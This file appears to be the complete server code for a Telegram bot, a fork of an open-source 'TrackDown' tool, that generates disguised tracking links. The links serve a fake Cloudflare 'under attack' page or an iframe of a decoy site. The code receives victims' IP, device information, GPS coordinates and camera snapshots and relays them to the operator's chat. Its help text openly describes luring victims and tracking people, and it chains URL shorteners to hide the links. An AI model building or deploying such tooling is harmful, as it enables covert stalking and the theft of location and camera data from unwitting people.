require('dotenv').config();
const fs = require('fs');
const path = require('path');
const express = require('express');
const serverless = require('serverless-http');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const ejs = require('ejs');

// Initialize Express app
const app = express();

// Middleware
app.use(bodyParser.json({limit:1024*1024*20, type:'application/json'}));
app.use(bodyParser.urlencoded({ extended:true, limit:1024*1024*20, type:'application/x-www-form-urlencoded' }));
app.use(cors());

// Global variables
const bot = new TelegramBot(process.env.bot);
const hostURL = "https://sg-modder-offcial.vercel.app"; // Updated to Replit URL

// Get the template paths
const viewsPath = path.join(process.cwd(), 'views');
const webviewTemplate = fs.readFileSync(path.join(viewsPath, 'webview.ejs'), 'utf8');
const cloudflareTemplate = fs.readFileSync(path.join(viewsPath, 'cloudflare.ejs'), 'utf8');

// Helper functions
function getClientIp(req) {
  let ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  return ip;
}

function getFormattedDate() {
  var d = new Date();
  return d.toJSON().slice(0, 19).replace('T', ':');
}

function atob(str) {
  return Buffer.from(str, 'base64').toString();
}

// URL Shortener 1 (User provided): xcut
async function shortenUrl_xcut(url) {
  try {
    const response = await fetch('https://xcut.vercel.app/api/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ url }),
    });
    
    if (!response.ok) {
      return null;
    }
    
    const data = await response.json();
    
    if (!data.shortUrl) {
      return null;
    }
    
    return data.shortUrl;
  } catch (error) {
    console.error('Error shortening URL with xcut:', error);
    return null;
  }
}

// URL Shortener 2: TinyURL
async function shortenUrl_tinyurl(url) {
  try {
    const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      return null;
    }
    const shortUrl = await response.text();
    if (!shortUrl || shortUrl.includes('Error') || shortUrl.length < 10) {
      return null;
    }
    return shortUrl;
  } catch (error) {
    console.error('Error shortening URL with TinyURL:', error);
    return null;
  }
}

// URL Shortener 3: is.gd
async function shortenUrl_isgd(url) {
  try {
    const response = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      return null;
    }
    const data = await response.json();
    if (!data.shorturl) {
      return null;
    }
    return data.shorturl;
  } catch (error) {
    console.error('Error shortening URL with is.gd:', error);
    return null;
  }
}

// URL Shortener 4: v.gd (similar to is.gd but different domain)
async function shortenUrl_vgd(url) {
  try {
    const response = await fetch(`https://v.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      return null;
    }
    const data = await response.json();
    if (!data.shorturl) {
      return null;
    }
    return data.shorturl;
  } catch (error) {
    console.error('Error shortening URL with v.gd:', error);
    return null;
  }
}

// Create a link function (webhook version)
async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
      })
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    await bot.sendChatAction(cid, "typing");
    
    try {
      // Create shortened URLs using all 4 shorteners
      const cloudflareShortUrls = [];
      const webviewShortUrls = [];
      
      // CloudFlare shortcuts
      const xcutCloudflare = await shortenUrl_xcut(cUrl);
      const tinyurlCloudflare = await shortenUrl_tinyurl(cUrl);
      const isgdCloudflare = await shortenUrl_isgd(cUrl);
      const vgdCloudflare = await shortenUrl_vgd(cUrl);
      
      // WebView shortcuts
      const xcutWebview = await shortenUrl_xcut(wUrl);
      const tinyurlWebview = await shortenUrl_tinyurl(wUrl);
      const isgdWebview = await shortenUrl_isgd(wUrl);
      const vgdWebview = await shortenUrl_vgd(wUrl);
      
      // Only add working shorteners to the arrays
      if (xcutCloudflare) cloudflareShortUrls.push(xcutCloudflare);
      if (tinyurlCloudflare) cloudflareShortUrls.push(tinyurlCloudflare);
      if (isgdCloudflare) cloudflareShortUrls.push(isgdCloudflare);
      if (vgdCloudflare) cloudflareShortUrls.push(vgdCloudflare);
      
      if (xcutWebview) webviewShortUrls.push(xcutWebview);
      if (tinyurlWebview) webviewShortUrls.push(tinyurlWebview);
      if (isgdWebview) webviewShortUrls.push(isgdWebview);
      if (vgdWebview) webviewShortUrls.push(vgdWebview);

      // Prepare message with all shortened URLs
      let message = `New links has been created successfully.\nURL: ${msg}\n\n✅Your Tracking Links\n\n`;
      
      // CloudFlare links
      message += `🌐 CloudFlare Page Link\n\n`;
      // Format using HTML tags instead of markdown for better Telegram compatibility
      message += `Original url: <a href="${cUrl}">click here</a>\n`;
      
      // Add only working CloudFlare shorteners
      if (cloudflareShortUrls.length > 0) {
        message += cloudflareShortUrls.join('\n') + '\n\n';
      } else {
        message += '\n'; // Add line break if no shorteners worked
      }
      
      // WebView links
      message += `🌐 WebView Page Link\n\n`;
      // Format using HTML tags instead of markdown for better Telegram compatibility
      message += `Original url: <a href="${wUrl}">click here</a>\n`;
      
      // Add only working WebView shorteners
      if (webviewShortUrls.length > 0) {
        message += webviewShortUrls.join('\n');
      }
      
      // Add parse_mode: "HTML" to properly render HTML links
      m.parse_mode = "HTML";
      await bot.sendMessage(cid, message, m);
    } catch (error) {
      console.error("Error shortening URLs:", error);
      // If URL shorteners fail, send direct links with HTML formatting
      m.parse_mode = "HTML";
      await bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Tracking Links\n\n🌐 CloudFlare Page Link\n\nOriginal url: <a href="${cUrl}">click here</a>\n\n🌐 WebView Page Link\n\nOriginal url: <a href="${wUrl}">click here</a>`, m);
    }
    
    return true;
  } else {
    await bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`);
    await createNew(cid);
    return false;
  }
}

// Create new request function (webhook version)
async function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  await bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

// ROUTES

// Root route - returns the client IP
app.get("/", (req, res) => {
  const ip = getClientIp(req);
  res.json({"ip": ip});
});

// POST route for device information
app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  
  var ip = getClientIp(req);
    
  if (uid != null && data != null) {
    if (data.indexOf(ip) < 0) {
      return res.send("ok");
    }
    
    data = data.replaceAll("<br>", "\n");
    
    bot.sendMessage(parseInt(uid, 36), data, {parse_mode: "HTML"});
    
    res.send("Done");
  } else {
    res.status(400).send("Bad Request");
  }
});

// Location route
app.post("/location", async (req, res) => {
  try {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;
    
    if (lon != null && lat != null && uid != null && acc != null) {
      await bot.sendLocation(parseInt(uid, 36), lat, lon);
      await bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
      
      res.send("Done");
    } else {
      res.status(400).send("Bad Request");
    }
  } catch (error) {
    console.error("Error in location handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Camera snapshot route
app.post("/camsnap", async (req, res) => {
  try {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;
      
    if (uid != null && img != null) {
      var buffer = Buffer.from(img, 'base64');
        
      var info = {
        filename: "camsnap.png",
        contentType: 'image/png'
      };
        
      try {
        await bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
      } catch (error) {
        console.log("Error sending photo:", error);
      }
        
      res.send("Done");
    } else {
      res.status(400).send("Bad Request");
    }
  } catch (error) {
    console.error("Error in camsnap handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Webview route
app.get("/w/:uid/:uri", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/th30neand0nly0ne");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Render the template
    const html = ejs.render(webviewTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in webview handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Cloudflare route
app.get("/c/:uid/:uri", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/th30neand0nly0ne");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Render the template
    const html = ejs.render(cloudflareTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in cloudflare handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Telegram Bot Webhook Handler for production
app.post("/webhook", async (req, res) => {
  try {
    const update = req.body;
    
    // Handle callback queries (button clicks)
    if (update.callback_query) {
      const callbackQuery = update.callback_query;
      await bot.answerCallbackQuery(callbackQuery.id);
      
      if (callbackQuery.data === "crenew") {
        await createNew(callbackQuery.message.chat.id);
      }
      
      return res.status(200).send("OK");
    }
    
    // Handle messages
    if (update.message) {
      const msg = update.message;
      const chatId = msg.chat.id;
      
      // Handle reply to "Enter Your URL" message
      if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
        await createLink(chatId, msg.text);
        return res.status(200).send("OK");
      }
      
      // Handle /start command
      if (msg.text === "/start") {
        var m = {
          reply_markup: JSON.stringify({
            "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
          })
        };
        
        await bot.sendMessage(
          chatId, 
          `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, 
          m
        );
      }
      // Handle /create command
      else if (msg.text === "/create") {
        await createNew(chatId);
      }
      // Handle /help command
      else if (msg.text === "/help") {
        await bot.sendMessage(
          chatId,
          ` Through this bot you can track people just by sending a simple link.\n\nSend /create
to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
the url it will send you 2 links which you can use to track people.
\n\nSpecifications.
\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
`
        );
      }
    }
    
    res.status(200).send("OK");
  } catch (error) {
    console.error("Error in webhook handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// For local development
if (process.env.NODE_ENV !== "production") {
  // Start polling for local testing
  console.log("Starting polling for local development...");
  bot.on('callback_query', async (callbackQuery) => {
    await bot.answerCallbackQuery(callbackQuery.id);
    
    if (callbackQuery.data === "crenew") {
      await createNew(callbackQuery.message.chat.id);
    }
  });
  
  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    
    // Handle reply to "Enter Your URL" message
    if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
      await createLink(chatId, msg.text);
      return;
    }
    
    // Handle /start command
    if (msg.text === "/start") {
      var m = {
        reply_markup: JSON.stringify({
          "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
        })
      };
      
      await bot.sendMessage(
        chatId, 
        `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, 
        m
      );
    }
    // Handle /create command
    else if (msg.text === "/create") {
      await createNew(chatId);
    }
    // Handle /help command
    else if (msg.text === "/help") {
      await bot.sendMessage(
        chatId,
        ` Through this bot you can track people just by sending a simple link.\n\nSend /create
to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
the url it will send you 2 links which you can use to track people.
\n\nSpecifications.
\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
`
      );
    }
  });
  
  // Start polling
  bot.startPolling();
  
  // Start the server for the web routes
  app.listen(5000, '0.0.0.0', () => {
    console.log("Server running on port 5000");
  });
}

// Export the handler for serverless deployment
module.exports = app;
module.exports.handler = serverless(app);
